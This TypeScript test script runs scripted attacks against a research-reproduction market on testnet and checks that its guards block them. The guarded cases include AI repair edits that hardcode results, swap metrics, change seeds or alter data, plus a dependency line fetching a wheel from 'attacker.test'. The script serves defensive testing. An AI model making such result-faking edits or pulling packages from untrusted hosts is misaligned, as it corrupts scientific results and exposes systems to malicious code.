/**
 * Tries to cheat, on testnet, and prints what happened to each attempt.
 *
 *   pnpm attack-demo
 *
 * Attacks on the contract use receipts written by this script, because the contract is what's being
 * tested, and no code is run for them. The markets are labelled [TEST]. Needs the owner's accounts;
 * the data-swap check also needs Docker, and is skipped without it.
 */
import { execFileSync } from "node:child_process";
import { generateLabKeyPair, specHash, type ClaimSpec } from "@rerun/shared";
import { loadDemo } from "../lab/orchestrator/src/demo/fixtures.ts";
import { need, testnetChain } from "../lab/orchestrator/src/lab/setup.ts";
import { LlmClient, llmConfigFromEnv } from "../lab/orchestrator/src/nearai/client.ts";
import { checkEdit, type RepairEdit } from "../lab/orchestrator/src/pipeline/guards.ts";
import { NearAiModel } from "../lab/orchestrator/src/pipeline/model.ts";
import { reproduce } from "../lab/orchestrator/src/pipeline/pipeline.ts";
import { DockerSandbox, sandboxImage } from "../lab/orchestrator/src/sandbox/docker.ts";
import { big, ensurePoints, getMarket, openPointsMarket, points, requireLabStopped, Scoreboard, scriptedReceipt, sleep } from "./lib/demo-kit.ts";

const LOCK_IN_SECS = 80;
const WINDOW_SECS = 300;
const SHORT_TIMEOUT_SECS = 60;
const NORMAL_TIMEOUT_SECS = 3 * 3600;
const ROGUE_CODEHASH = "bad0".repeat(16);

const board = new Scoreboard();

function dockerAvailable(): boolean {
  try {
    execFileSync(process.env.DOCKER_BIN || "docker", ["image", "inspect", sandboxImage("python3.11")], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

/** The AI tries to change the science. These are the code guards the Lab runs on every edit. */
function repairAttacks() {
  const guard = { dataPaths: ["data/trials.csv"], outputPath: "results.json", fileExists: true };
  const edit = (e: Partial<RepairEdit>): RepairEdit => ({ file: "reproduce.py", kind: "ENV", justification: "just an environment fix, honestly", search: "", replace: "", ...e });
  const attacks: [string, RepairEdit, RegExp][] = [
    ["The AI tries to hardcode a better result", edit({ search: "accuracy = model.score(X_test, y_test)", replace: "accuracy = 0.99" }), /numbers changed|analysis/],
    ["The AI tries to swap the metric", edit({ search: "accuracy = accuracy_score(y, p)", replace: "accuracy = balanced_accuracy_score(y, p)" }), /analysis/],
    ["The AI tries to change the random seed", edit({ search: "random_state=42", replace: "random_state=7" }), /numbers changed/],
    ["The AI tries to edit the data", edit({ file: "data/trials.csv", kind: "PATH", search: "1,0", replace: "1,1" }), /data files/],
    ["The AI tries to install a package from a stranger's server", edit({ file: "requirements.txt", kind: "DEPENDENCY", search: "pandas", replace: "evil @ https://attacker.test/evil.whl" }), /default package registry/],
  ];
  for (const [name, e, why] of attacks) {
    const reason = checkEdit(e, guard);
    board.add(name, reason !== null && why.test(reason), "BLOCKED", reason ?? "the guard allowed it");
  }
}

/** A real run with no AI credits: the dataset no longer matches the hash pinned in the claim. */
async function dataSwapAttack(labKeys: { publicKey: string; privateKey: string }) {
  if (!dockerAvailable()) return board.skip("A data file is swapped after the claim opens", "needs Docker and the sandbox image");
  const demo = loadDemo("swapped-data", labKeys);
  const llm = new LlmClient({ ...llmConfigFromEnv(), mock: true }, demo.mockResponder);
  llm.newRun();
  const { spec } = demo;
  const { receipt } = await reproduce(
    { spec, marketId: 0, runIndex: 0, labAccount: "attack-demo.testnet", labCodehash: "0".repeat(64), labKeys },
    {
      sandbox: new DockerSandbox({ image: sandboxImage(spec.artifact.runtime), cpus: 1, memGb: 1 }),
      model: new NearAiModel(llm, "scripted"),
      resolver: demo.resolver,
    },
  );
  board.add("A data file is swapped after the claim opens", receipt.outcome === "INVALID" && receipt.invalid_reason === "HASH_MISMATCH", "PASS", `${receipt.outcome}, ${receipt.invalid_reason}: the code never ran`);
}

async function main() {
  await requireLabStopped();
  const chain = testnetChain();
  const owner = chain.account(need("TESTNET_OWNER_ACCOUNT"), need("TESTNET_OWNER_PRIVATE_KEY"));
  const strangerAccount = chain.account(need("TESTNET_FT_ACCOUNT"), need("TESTNET_FT_PRIVATE_KEY"));
  const lab = chain.account(need("TESTNET_LAB_ACCOUNT"), need("TESTNET_LAB_PRIVATE_KEY"));
  const codehash = need("LAB_CODEHASH");
  const labKeys = process.env.LAB_ENC_PUBLIC_KEY ? { publicKey: need("LAB_ENC_PUBLIC_KEY"), privateKey: need("LAB_ENC_PRIVATE_KEY") } : generateLabKeyPair();

  console.log("Attacks on the AI repair step (no chain involved):");
  repairAttacks();

  console.log("\nAttack on the data:");
  await dataSwapAttack(labKeys);

  console.log("\nSetting up two [TEST] claims on testnet...");
  await ensurePoints(chain, owner);
  await ensurePoints(chain, strangerAccount);
  const base = loadDemo("reproduces", labKeys).spec;
  const labelled = (title: string): ClaimSpec => ({ ...base, title, statement: "TEST, not research. A market used to try attacks against the contract. No code is run for it." });
  const silent = await openPointsMarket(chain, owner, labelled("[TEST] Attack demo: fake results and a silent Lab"), LOCK_IN_SECS, WINDOW_SECS);
  const disputed = await openPointsMarket(chain, owner, labelled("[TEST] Attack demo: two runs that disagree"), LOCK_IN_SECS, WINDOW_SECS);
  console.log(`  markets ${silent} and ${disputed}. Waiting for them to lock...`);
  await sleep((LOCK_IN_SECS + 3) * 1000);

  // Shortened for a moment so the silent-Lab case doesn't take three hours. Always restored.
  await chain.call(owner, "set_timing", { run_timeout_secs: SHORT_TIMEOUT_SECS, min_challenge_window: 60, max_challenge_window: 14 * 86400 });
  try {
    await chain.call(lab, "start_run", { market_id: silent });
    const running = await getMarket(chain, silent);

    console.log("\nAttacks on the contract:");
    await board.blocked("A stranger posts a fake result", "caller is not a registered Lab", () =>
      chain.call(strangerAccount, "propose_result", { receipt: scriptedReceipt(running, strangerAccount.accountId, codehash) }, { tgas: 200 }),
    );

    await chain.call(owner, "approve_codehash", { codehash: ROGUE_CODEHASH });
    await chain.call(owner, "register_lab_local", { lab_account: strangerAccount.accountId, codehash: ROGUE_CODEHASH, enc_pubkey: "0".repeat(64) });
    await chain.call(owner, "revoke_codehash", { codehash: ROGUE_CODEHASH });
    await board.blocked("A Lab whose code was banned posts a result", "Lab codehash is not approved", () =>
      chain.call(strangerAccount, "propose_result", { receipt: scriptedReceipt(running, strangerAccount.accountId, ROGUE_CODEHASH) }, { tgas: 200 }),
    );
    await chain.call(owner, "remove_lab", { lab_account: strangerAccount.accountId });

    await board.blocked("A real Lab posts a receipt for a different claim", "spec_hash does not match", () =>
      chain.call(lab, "propose_result", { receipt: scriptedReceipt(running, lab.accountId, codehash, { spec_hash: specHash(base) === running.spec.spec_hash ? "f".repeat(64) : specHash(base) }) }, { deposit: "0.2", tgas: 200 }),
    );
    await board.blocked("A real Lab claims a pass its own number contradicts", "outcome contradicts measured_value", () =>
      chain.call(lab, "propose_result", { receipt: scriptedReceipt(running, lab.accountId, codehash, { measured_value: "0.5" }) }, { deposit: "0.2", tgas: 200 }),
    );
    await board.blocked("A real Lab reports the wrong code version", "commit does not match", () =>
      chain.call(lab, "propose_result", { receipt: scriptedReceipt(running, lab.accountId, codehash, { commit: "f".repeat(40) }) }, { deposit: "0.2", tgas: 200 }),
    );
    await board.blocked("A stranger tries to approve their own Lab", "owner only", () =>
      chain.call(strangerAccount, "approve_codehash", { codehash: ROGUE_CODEHASH }),
    );

    console.log("\nTwo runs that disagree (receipts scripted, to force the disagreement):");
    await chain.call(lab, "start_run", { market_id: disputed });
    const d = await getMarket(chain, disputed);
    await chain.call(lab, "propose_result", { receipt: scriptedReceipt(d, lab.accountId, codehash) }, { deposit: "0.2", tgas: 200 });
    const challengerStart = big(await chain.view("get_balance", { account_id: strangerAccount.accountId, mode: "points" }));
    await chain.call(strangerAccount, "challenge", { market_id: disputed, reason: "NONDETERMINISTIC", note_hash: "c".repeat(64) }, { deposit: "0.02" });
    await board.blocked("The Lab re-uses the same AI for its second run", "re-run must use a different model", async () => {
      const c = await getMarket(chain, disputed);
      return chain.call(lab, "propose_rerun_result", { receipt: scriptedReceipt(c, lab.accountId, codehash, { run_index: 1 }) }, { deposit: "0.2", tgas: 200 });
    });
    const c = await getMarket(chain, disputed);
    await chain.call(
      lab,
      "propose_rerun_result",
      {
        receipt: scriptedReceipt(c, lab.accountId, codehash, {
          run_index: 1,
          outcome: "NOT_REPRODUCED",
          measured_value: "0.5",
          nearai: { model_id: "scripted-second-model", attestation_digest: "0".repeat(64), response_signature_refs: [] },
        }),
      },
      { deposit: "0.2", tgas: 200 },
    );
    const settled = await getMarket(chain, disputed);
    board.add("A challenge exposes two runs that disagree", settled.outcome === "INVALID" && settled.invalid_reason === "RUNS_DISAGREE", "PASS", `${settled.outcome}, ${settled.invalid_reason}`);
    const gain = big(await chain.view("get_balance", { account_id: strangerAccount.accountId, mode: "points" })) - challengerStart;
    board.add("The challenger gets the deposit back, plus a reward", gain === big(settled.creation_bond) / 2n, "PASS", `up ${points(gain)} points`);

    console.log(`\nThe Lab goes silent (waiting ${SHORT_TIMEOUT_SECS}s)...`);
    await board.blocked("Someone tries to void the market before the deadline", "market is not stale", () => chain.call(strangerAccount, "refund_stale", { market_id: silent }));
    const deadline = (await getMarket(chain, silent)).run_deadline!;
    await sleep((deadline - Math.floor(Date.now() / 1000) + 3) * 1000);
    await chain.call(strangerAccount, "refund_stale", { market_id: silent });
    const stale = await getMarket(chain, silent);
    board.add("A silent Lab can't trap anyone's money", stale.outcome === "INVALID" && stale.invalid_reason === "STALE", "PASS", `${stale.outcome}, ${stale.invalid_reason}: every share pays back half`);
    const refund = big((await chain.call(owner, "redeem", { market_id: silent }, { deposit: "0.01" })).value);
    board.add("Forecasters collect after a silent Lab", refund > 0n, "PASS", `${points(refund)} points`);
    await chain.call(owner, "redeem", { market_id: disputed }, { deposit: "0.01" });
  } finally {
    await chain.call(owner, "set_timing", { run_timeout_secs: NORMAL_TIMEOUT_SECS, min_challenge_window: 60, max_challenge_window: 14 * 86400 });
    console.log("\nRestored the normal Lab deadline.");
  }

  board.finish();
}

main().catch((e) => {
  console.error(e instanceof Error ? e.message : e);
  process.exitCode = 1;
});
